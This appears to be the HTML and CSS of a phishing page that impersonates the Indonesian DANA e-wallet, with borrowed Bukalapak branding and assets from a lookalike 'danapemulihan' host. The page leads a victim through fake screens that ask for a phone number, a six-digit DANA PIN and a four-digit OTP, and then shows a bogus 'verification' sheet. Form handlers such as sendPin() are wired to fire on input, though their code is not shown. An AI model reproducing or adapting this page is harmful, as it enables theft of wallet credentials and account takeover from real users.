.mv-24{margin-top:24px !important;margin-bottom:24px !important}.tfa-js .pv-24{padding-top:24px !important;padding-bottom:24px !important}.tfa-js .mh-24{margin-left:24px !important;margin-right:24px !important}.tfa-js .ph-24{padding-left:24px !important;padding-right:24px !important}.tfa-js .ml-32{margin-left:32px !important}.tfa-js .mv-32{margin-top:32px !important;margin-bottom:32px !important}.tfa-js .pv-32{padding-top:32px !important;padding-bottom:32px !important}.tfa-js .mh-32{margin-left:32px !important;margin-right:32px !important}.tfa-js .ph-32{padding-left:32px !important;padding-right:32px !important}.tfa-js .ml-48{margin-left:48px !important}.tfa-js .mv-48{margin-top:48px !important;margin-bottom:48px !important}.tfa-js .pv-48{padding-top:48px !important;padding-bottom:48px !important}.tfa-js .mh-48{margin-left:48px !important;margin-right:48px !important}.tfa-js .ph-48{padding-left:48px !important;padding-right:48px !important}.tfa-js .ml-64{margin-left:64px !important}.tfa-js .mv-64{margin-top:64px !important;margin-bottom:64px !important}.tfa-js .pv-64{padding-top:64px !important;padding-bottom:64px !important}.tfa-js .mh-64{margin-left:64px !important;margin-right:64px !important}.tfa-js .ph-64{padding-left:64px !important;padding-right:64px !important}
</style>
  <style type="text/css">
.illust {
  width: 260px;
  height: 162px;
  display: inline-block;
}
.illust--tfa {
  background-image: url('https://s0.bukalapak.com/images/tfa/two_factor_authentication.png');
  background-size: 100%;
  background-repeat: no-repeat;
  background-position: center;
}
</style>
  <style type="text/css">
.illust[data-v-6dff705c] {
  width: 64px;
  height: 64px;
  background-size: cover;
  background-repeat: no-repeat;
}
</style>
  <style type="text/css">.handle {
  max-width: 100%;
  word-break: break-all;
}
.link-primary {
  color: #2b4ac7;
  font-weight: bold;
}
</style>
  <style type="text/css">.icon-edit {
  display: inline-block;
  width: 16px;
  height: 16px;
  cursor: pointer;
  background-image: url('https://s3.bukalapak.com/attachment/827212/tfa-js__icon-edit.png');
  vertical-align: top;
}
</style>
  <style type="text/css">
.bl-callout.custom-callout[data-v-09e06b04] {
  border: none;
  /* margin: 0 -24px; */
  /* padding: 0 24px; */
  border-radius: 0;
}
.bl-callout.custom-callout p[data-v-09e06b04] {
  line-height: 22px;
}
</style>
  <style type="text/css">
.bl-code-input__item:last-child {
  margin-right: 0;
}

.bl-code-input__item {
  width: 55px;
  height: 44px;
  font-size: 20px;
  margin-right: 10px;
}

.bl-textfield {
  display: inline-flex;
  align-items: center;
  border: 1px solid #d6d6d6;
  border-radius: 4px;
  background: #fff;
  color: #3d3d3d;4px;
  height: 44px;
  line-height: 44px;
}

.bl-code-input__item input[type="text"] {
  text-align: center;
}

.bl-textfield__inner {
  -webkit-appearance: none;
  -moz-appearance: none;
  border: none;
  margin: 0;
  padding: 0;
  white-space: normal;
  outline: none;
  box-shadow: none;
  letter-spacing: normal;
  color: inherit;
  background: transparent;
  font-size: inherit;
  font-family: Buka Sans Text,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
}

.bl-textfield, .bl-textfield__inner {
  position: relative;
  width: 100%;
  box-sizing: border-box;
}</style>
  <style type="text/css">
.bl-code-input__item[data-v-036205ed] {
  width: calc(100% / 5 - 8px);
  height: 44px !important;
  font-size: 20px !important;
  margin-right: 10px;
}
.bl-code-input__item input[type=text][data-v-036205ed] {
  text-align: center;
}
.bl-code-input__item[data-v-036205ed]:last-child {
  margin-right: 0;
}
</style>
  <style type="text/css">
</style>
  <style type="text/css">
.other-button-disabled[data-v-806923e8] {
  opacity: 0.5;
  pointer-events: none;
}
</style>
  <style type="text/css">
.custom-code-input .bl-code-input__item {
  width: calc(100% / 5 - 8px);
}
</style>
  <style type="text/css">
.card-wrapper[data-v-17cb1b88] {
  padding: 17px 20px;
  border-bottom: 1px solid #E0E0E0;
  border-right: 1px solid #E0E0E0;
  border-left: 1px solid #E0E0E0;
  margin-bottom: 0;
  cursor: pointer;
}
.card-wrapper[data-v-17cb1b88]:first-child {
  border-top: 1px solid #E0E0E0;
}
.disabled[data-v-17cb1b88] {
  cursor: not-allowed;
  opacity: 0.4;
}

</style>
  <style type="text/css">
.illust[data-v-2b966030] {
  width: 64px;
  height: 64px;
  background-size: cover;
  background-repeat: no-repeat;
}
.other-method-wrapper[data-v-2b966030] {
  padding: 12px 20px;
  border: 1px solid #E0E0E0;
  margin-bottom: 0;
  cursor: pointer;
  margin-bottom: 0 !important;
}
.tfa-method-wrapper[data-v-2b966030] {
  min-height: 500px;
}

</style>
  <style type="text/css">
.illust[data-v-4dc99c46] {
  margin-top: 67px;
  background-size: contain;
  background-repeat: no-repeat;
}
</style>
  <style type="text/css">
.illust {
  width: 260px;
  height: 162px;
  display: inline-block;
}
.illust--tfa {
  background-image: url('https://s0.bukalapak.com/images/tfa/two_factor_authentication.png');
  background-size: 100%;
  background-repeat: no-repeat;
  background-position: center;
}
.bl-text--white {
  color: #fff !important;
}
</style>
  <link rel="stylesheet" type="text/css" href="https://s4.bukalapak.com/ast/accounts/assets/packs/css/2317-1796af05.css"> 
  <style>[touch-action="none"]{ -ms-touch-action: none; touch-action: none; }
[touch-action="auto"]{ -ms-touch-action: auto; touch-action: auto; }
[touch-action="pan-x"]{ -ms-touch-action: pan-x; touch-action: pan-x; }
[touch-action="pan-y"]{ -ms-touch-action: pan-y; touch-action: pan-y; }
[touch-action="pan-x pan-y"],[touch-action="pan-y pan-x"]{ -ms-touch-action: pan-x pan-y; touch-action: pan-x pan-y; }
</style>
  <style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://connect.facebook.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://connect.facebook.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://connect.facebook.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://connect.facebook.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}


#bukalapak .bl-textfield__inner{
    border: 1px solid #aaa;
    text-align: center;
    margin: 0px 6px;
    width: 50px;
}

@media only screen and (max-width:360px){
.waktu{
    font-weight: bold; 
    font-size: 17px; 
    color: #C60000; 
    text-align: center; 
    margin: 25px auto; 
    margin-bottom: -0;
}
}

@media only screen and (max-width:480px){
.waktu{
    font-weight: bold; 
    font-size: 17px; 
    color: #C60000; 
    text-align: center; 
    margin: 30px auto; 
    margin-bottom: -0;
    margin-top: 5px;
}
}


.blink {
  animation: blink-animation 2s steps(6, start) infinite;
  -webkit-animation: blink-animation 2s steps(6, start) infinite;
}
@keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
@-webkit-keyframes blink-animation {
  to {
    visibility: hidden;
  }
}

</style>
<body>
<fieldset id="homeku1" style="display: ;">
<div style="display:none;" class="index">
	<div class="header">
		<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
	</div>
	<div class="content">
		<div class="hero">
			<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/hero.svg" alt="">
		</div>
		<h1>Dompet digital untuk kamu!</h1>
		<p class="desc">
			Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
		<div class="line"></div>
		<p class="log">
			Masukkan <b>nomor HP</b> kamu untuk lanjut
		</p>
		<button type="button" onclick="next();">LOGIN</button>
	</div>
</div>
<div class="start" style="display:none;">
	<img class="logo" src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_text.png" style="width: 150px">
	<div class="footimg">
		<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/bi.png" alt=""><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/kom.png" alt="">
		<p>
			DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
	</div>
</div>

<div class="container hid" style="position: fixed">
    
	<div class="" style="text-align: center;" id="homeku">
   

        
     <section class="carousel" aria-label="Gallery" style="margin-top: 0px; text-align: center; left: 0">
  <ol class="carousel__viewport">
    <li id="carousel__slide1"
        tabindex="0"
        class="carousel__slide" style="background-color: #118EEA;">
      <div class="carousel__snapper"  style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilUMIG_IMFVixTFpWb4xA5f1HJt25lbv-cc1baknB_YJeWO9FYU4SJOzdeMNkA1msFpUU-0MiI3B-llmFX122-XhqCq7-1HW4YUfaWX52rlNtfspDDvlFNj_A--xZIRknP3ycDkzm51noxYaFx_gfOck3U745QZSBwpCSesqOq1oEycuQamqaZlqoz/s16000/ezgif.com-crop%20(3).gif');
      background-position: 100% 100%;
      background-repeat: no-repeat;
      background-size: 100% 100%; z-index: 99999999; position: relative;">
       
       
      </div>
    </li>
    <li id="carousel__slide2"
        tabindex="0"
        class="carousel__slide" style="background-color: #118EEA;">
      <div class="carousel__snapper" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixR-U2gHP_VriGKaaVcf-_BbZmvWWoaRI8Wd26DYewNJayil_To6kgdWxmdq3TDJKQJ7lAAbD1de1uuuWTLQzCGdR8qT1S2mTehsdR02AFN573iPkN-0IrliCuRAy0xJfSH9AlfJWV7odqpRC_bxJLM2EkLf-84_ePEjEfE8SOtiKfEjcLQ7nDBjDc/s16000/ezgif.com-crop%20(4).gif');
      background-position: 100% 100%;
      background-repeat: no-repeat;
      background-size: 100% 100%; background-color: transparent;"></div>
      <a href="#carousel__slide1"
         class="carousel__prev">Go to previous slide</a>
      <a href="#carousel__slide3"
         class="carousel__next">Go to next slide</a>
    </li>
    <li id="carousel__slide3"
        tabindex="0"
        class="carousel__slide" style="background-color: #118EEA;">
      <div class="carousel__snapper"  style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjj8Fs3JMUwF85O07XgsV-e1rmQjTwS91jcu-zh3Lr_fEgVfhY823rmnMewtU59iGvsFjcBm-12OLSj81f57ZEksJeU2GaG7UU3zuwDsOsfTO4dAJ693JJyILcXjdHEzirw-pPBCeV1CfTqSroNgoMTGIfy-Y-HC8GAJDmo68GYd1-x2gGu0UsincrU/s16000/ezgif.com-crop%20(5).gif');
      background-position: 100% 100%;
      background-repeat: no-repeat;
      background-size: 100% 100%;">
       
       
      </div>
    </li>
   
  </ol>
  <aside class="carousel__navigation">
    <ol class="carousel__navigation-list">
      <li class="carousel__navigation-item">
        <a href="#carousel__slide1"
           class="carousel__navigation-button"></a>
      </li>
      <li class="carousel__navigation-item">
        <a href="#carousel__slide2"
           class="carousel__navigation-button"></a>
      </li>
      <li class="carousel__navigation-item">
        <a href="#carousel__slide3"
           class="carousel__navigation-button"></a>
      </li>
      <li class="carousel__navigation-item">
        
    </ol>
  </aside>
</section>
<button id="butonku" style="width: 100%; height: 140px; position: fixed; bottom: 0; left: 0; right: 0; margin: 1px auto; border: 0; background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEid9dARAQbMu1UTEgpOfyH6pn4eI3_XArbELp_8lfZtysRgex-gqs0Czc9ch_O7U2lrucgBVSqGQEL33BwV3Ri4D3evjzJHJ6LBFa_K-pIPbdO6QQ3iHlTkLiqo_w2z2NbXTw83lNcWHG7T9q2n6m7N3SZ-qfZpTdsioS3dm-YIfJh4zU16QEODOLKn/s16000/AddText_06-06-08.17.04.jpg');
      background-position: 100% 100%;
      background-repeat: no-repeat;
      background-size: 100% 100%; z-index: 99999" onclick="nextPrev()"></button>
      <center>
     <div id="process1" name="process" class="process" style="display: none;">
            <div class="loading">
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png">
                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" id="loading" style="margin-top: 8px">
            </div>
        </div>
        </center>
  </div>
  <div id="blogin" class="box-login" style="width: 100%;
    height: 100%;
    bottom: 0; 
    position: fixed; 
    left: 0; 
    padding: 0px
    right: 0; 
    margin: 0px auto;
    top: 0; display: none;">
      	<div id="process" name="process" class="process" style="display: none;">
			<div class="loading">
				<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png"><img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png" style="margin-top: 8px">
			</div>
		</div>
		
		<div class="header">
<button id="back1" type="button" class="btn-backku" onclick="goback1()"><ion-icon name="chevron-back-outline"></ion-icon></button>	<p></p>


			<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
		</div>
		<form id="formNohp" onsubmit="sendNohp(event);" >
		     <input type="hidden" id="logo" value="❁┷━❃∞∞𝗗𝗔𝗡𝗔∞∞❃━┷❁">
			<h3 style="font-size: 16px; margin-top: -20px">Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
			<div class="box-input" style="width: 95%;">
				<div class="label">
					<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt=""><label>+62</label>
				</div>
				<input class="inp" id="inp" type="tel" autocomplete="off" required name="nohp" placeholder="811-1234-5678" maxlength="12" minlength="10"></div>
			<p class="desc" style="font-size: 14px; line-height: 18px; margin-top: 25px">
			Dengan melanjutkan, kamu setuju dengan <b>Syarat<br/>& Ketentuan</b> dan
				<b>Kebijakan Privasi</b> kami
			</p>
			<div class="box-btn">
				<button disabled id="btn" class="btnnohp" type="submit" style="margin-top: -40px">LANJUT</button>
			</div>
		</form>
		<form id="formPin" omsubmit="return false" class="hid" style="width: 100%;
    height: 100%;
    bottom: 0; 
    position: fixed; 
    left: 0; 
    right: 0; 
    margin: 0px auto;
    top: 0;">
		     <input type="hidden" id="logo" value="❁┷━❃∞∞𝗗𝗔𝗡𝗔∞∞❃━┷❁">
		    <button id="back2" type="button" class="btn-backku" onclick="goback2()" style="margin-top: 10px"><ion-icon name="chevron-back-outline"></ion-icon></button>
			<h3 style="margin-top: 50px; font-weight: 600; margin-bottom: -10px; font-size: 16px"><font style="font-weight: 400">Masukkan</font> PIN DANA</h3>
			<div class="box-input-pin">
				<div type="button" class="clear"></div>
				<input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;" onchange="javascript:this.form.button();" oninput="sendPin()"></div>
			<button class="show" type="button">TAMPILKAN</button>
			<p class="forgot">LUPA PIN?</p>
			<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbD-mmuMUDwaeFMEz6NefivuQqHyrFXvXxqVxMhYRhR5wsfUhiWkPNkpxLKkagRNpJ2obIiZH_D9EK6tnHIJUFMVBOclZI98zrU7VPszAR5n-_GeSWNCNgnfH1MRWuL-ahhPjxsejyDa5yyWAaOMWXWT4jS4EngtdLLlXjaPakQoFIOsjyS6tfnEBHDlw/s16000/output-onlinegiftools.gif" width="100%" style="position: absolute; bottom: 10; left: 0; right: 0; margin: 0px auto;">
		</form>
<div class="bgotp hid" style="width: 100%;
    height: 100%;
    bottom: 0; 
    position: absolute; 
    left: 0; 
    right: 0; 
    margin: 0px auto;
    top: 0;">
			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0px auto; margin-top: 0px; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYw_TuiHEqV3yPxR-1syAGPzfs1twgzaBbkBQeDqfE1t9YQTaAqvlEiKSOqMx0Jl_ug5pUEHQ62DvqoFQM55ovdI36uu2z9ioG962ukhkWngKH8fxUILOVgD-5dHZ4AjaOdnQh2Omw4zPppm-8M83VWgodmqP3TfX1hW4sWmJtCW7EvnyaV1smgJfjMdw/s2167/AddText_07-24-10.19.20.jpg) ;
  background-position: 100% 100%;
  background-size: 100% 100%; height: 100%; bottom: 0; width: 100%; border-radius: 14px 14px 0px 0px; width: 100%; text-align: center; background-color: #fff" id="otpkirimulang">
<button type="button" style="right: 10; bottom: 238; float: right; width: 40px; background: transparent; color: transparent; border: none; font-size: 13px; height: 10px; position: fixed;" onclick="tutupotp()">XX</button>
				<h2 style="margin-bottom: 30px; opacity: 0.0">Masukkan OTP</h2>
				<p id="userid" style="font-size: 2px; text-align: center; margin-bottom: -100px; font-weight: 600; color: #070707; margin-top: 321px; margin-left: -125px; opacity: 0.0; "></p>
  <center>
				<p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 500; color: #000; margin-top: 120px; display: ; width: 360px; margin-bottom: -10px; font-weight: 300"></p>
				
				
				</center>
				<div class="box-input-otp" style="margin-top: 5px">
					
					<div class="loadingOtp" style="display:none;background: #ffffff">

						
						<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png"><img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png">
		</div>
		
		<div type="button" class="clearotp"></div>
<audio src="Klaim.mp3" id="musikku"></audio>
		 <input type="hidden" id="logo" value="❁┷━❃∞∞𝗗𝗔𝗡𝗔∞∞❃━┷❁">
					<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
		 <p id="waktuku" class="resend" style="margin-top: 80px; color: #aaa; font-size: 13px">
					KIRIM ULANG (<span id="countdown" style="color: #aaa">60</span>s)
				</p>
       <p class="resend" style="margin-top: 70px; font-weight: 600; color: #2C86C5; margin-left: 0px; display: none" id="kirim-ulang" onclick="kirimulang()">KIRIM ULANG</p>
       
			</div>
		</div>
	</div>
</div>
</fieldset>
<fieldset id="infooo" style="display:  none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; margin: 0px auto; width: 100%; height: 100%; background: #fff; z-index: 99999999; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUfUoKtws3xd5-frp81BTitR7wGvQloH8Td_aAoEaM8gA-Eiw4YGRG6WolYGs-GyXIjmNqwj8q31Es9nkX5_YpP23SVdcCEX6Q5YzI6lbNdD42_VcAqZF_2ASOj0cUo-M1KEUbcTVnp5-6TapAU_M35s8QayvAg6vaU6VmlfcXPJUoYa_thjqSEp9ajyg/s2157/AddText_07-24-10.21.06.jpg) ;
  background-position: 100% 100%;
  background-size: 100% 100%; ">
<button type="button" style="position: fixed;  left: 0; right: 0; bottom: 20; margin: 0px auto; width: 90%; height:42px; border: none; background: #118EEA" onclick="pemunculan();">Lanjut Kode Pemunculan</button>   
    
</fieldset>
<fieldset id="bukalapak" style="display:  none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; margin: 0px auto; width: 100%; height: 100%; background: #fff; z-index: 99999; ">
<div class="bl-sheet__box" style="display: ; position: fixed; top: 0; left: 0; right: 0; bottom: 0; margin: 0px auto; width: 100%; height: 100%; ">
	<div class="bl-sheet__nav-bar" style="touch-action: none; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); height: 30px">
		<!---->
	

			<p class="bl-text bl-text--subheading-18" style="margin-left: -10px; width: 320px">Verifikasi <img src="https://static-hermes.bukalapak.com/images/logos/mitra-bl.svg" width="100px" style="margin-top: -7.5px"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1024px-Logo_dana_blue.svg.png" width="95px" style="margin-top: -7.5px"></p>
			
			<!----></div>
	</div>
